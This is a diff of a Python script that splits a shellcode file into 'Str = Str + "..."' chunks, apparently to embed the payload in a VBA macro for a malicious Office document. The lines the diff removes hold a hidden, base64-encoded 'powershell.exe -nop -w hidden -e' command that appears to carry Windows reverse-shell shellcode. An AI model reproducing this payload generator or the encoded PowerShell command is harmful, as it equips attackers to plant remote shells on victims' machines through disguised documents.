@@ -1,39 +1,9 @@
 from sys import argv
+from sys import stdout
 
 with open(argv[1]) as f:
         shellcode = f.read()
-
-payload = fr"powershell.exe -nop -w hidden -e dW5zaWduZWQgY2hhciBidWZbXSA9IAoiXHhmY1x4ZThceDgyXHgwMFx4MDBceDAw
-XHg2MFx4ODlceGU1XHgzMVx4YzBceDY0XHg4Ylx4NTBceDMwIgoiXHg4Ylx4NTJc
-eDBjXHg4Ylx4NTJceDE0XHg4Ylx4NzJceDI4XHgwZlx4YjdceDRhXHgyNlx4MzFc
-eGZmIgoiXHhhY1x4M2NceDYxXHg3Y1x4MDJceDJjXHgyMFx4YzFceGNmXHgwZFx4
-MDFceGM3XHhlMlx4ZjJceDUyIgoiXHg1N1x4OGJceDUyXHgxMFx4OGJceDRhXHgz
-Y1x4OGJceDRjXHgxMVx4NzhceGUzXHg0OFx4MDFceGQxIgoiXHg1MVx4OGJceDU5
-XHgyMFx4MDFceGQzXHg4Ylx4NDlceDE4XHhlM1x4M2FceDQ5XHg4Ylx4MzRceDhi
-IgoiXHgwMVx4ZDZceDMxXHhmZlx4YWNceGMxXHhjZlx4MGRceDAxXHhjN1x4Mzhc
-eGUwXHg3NVx4ZjZceDAzIgoiXHg3ZFx4ZjhceDNiXHg3ZFx4MjRceDc1XHhlNFx4
-NThceDhiXHg1OFx4MjRceDAxXHhkM1x4NjZceDhiIgoiXHgwY1x4NGJceDhiXHg1
-OFx4MWNceDAxXHhkM1x4OGJceDA0XHg4Ylx4MDFceGQwXHg4OVx4NDRceDI0Igoi
-XHgyNFx4NWJceDViXHg2MVx4NTlceDVhXHg1MVx4ZmZceGUwXHg1Zlx4NWZceDVh
-XHg4Ylx4MTJceGViIgoiXHg4ZFx4NWRceDY4XHgzM1x4MzJceDAwXHgwMFx4Njhc
-eDc3XHg3M1x4MzJceDVmXHg1NFx4NjhceDRjIgoiXHg3N1x4MjZceDA3XHhmZlx4
-ZDVceGI4XHg5MFx4MDFceDAwXHgwMFx4MjlceGM0XHg1NFx4NTBceDY4IgoiXHgy
-OVx4ODBceDZiXHgwMFx4ZmZceGQ1XHg1MFx4NTBceDUwXHg1MFx4NDBceDUwXHg0
-MFx4NTBceDY4IgoiXHhlYVx4MGZceGRmXHhlMFx4ZmZceGQ1XHg5N1x4NmFceDA1
-XHg2OFx4YzBceGE4XHg3N1x4ZjBceDY4IgoiXHgwMlx4MDBceDBmXHhjOFx4ODlc
-eGU2XHg2YVx4MTBceDU2XHg1N1x4NjhceDk5XHhhNVx4NzRceDYxIgoiXHhmZlx4
-ZDVceDg1XHhjMFx4NzRceDBjXHhmZlx4NGVceDA4XHg3NVx4ZWNceDY4XHhmMFx4
-YjVceGEyIgoiXHg1Nlx4ZmZceGQ1XHg2OFx4NjNceDZkXHg2NFx4MDBceDg5XHhl
-M1x4NTdceDU3XHg1N1x4MzFceGY2IgoiXHg2YVx4MTJceDU5XHg1Nlx4ZTJceGZk
-XHg2Nlx4YzdceDQ0XHgyNFx4M2NceDAxXHgwMVx4OGRceDQ0IgoiXHgyNFx4MTBc
-eGM2XHgwMFx4NDRceDU0XHg1MFx4NTZceDU2XHg1Nlx4NDZceDU2XHg0ZVx4NTZc
-eDU2IgoiXHg1M1x4NTZceDY4XHg3OVx4Y2NceDNmXHg4Nlx4ZmZceGQ1XHg4OVx4
-ZTBceDRlXHg1Nlx4NDZceGZmIgoiXHgzMFx4NjhceDA4XHg4N1x4MWRceDYwXHhm
-Zlx4ZDVceGJiXHhmMFx4YjVceGEyXHg1Nlx4NjhceGE2IgoiXHg5NVx4YmRceDlk
-XHhmZlx4ZDVceDNjXHgwNlx4N2NceDBhXHg4MFx4ZmJceGUwXHg3NVx4MDVceGJi
-IgoiXHg0N1x4MTNceDcyXHg2Zlx4NmFceDAwXHg1M1x4ZmZceGQ1IjsK"
-
 n = 50
 
-for i in range(0, len(payload), n):
-    print(r"Str = Str + " + '"' + shellcode[i:i+n] + '"')
+for i in range(0, len(shellcode), n):
+    stdout.write("Str = Str + " + '"' + shellcode[i:i+n] + '"' + '\n')
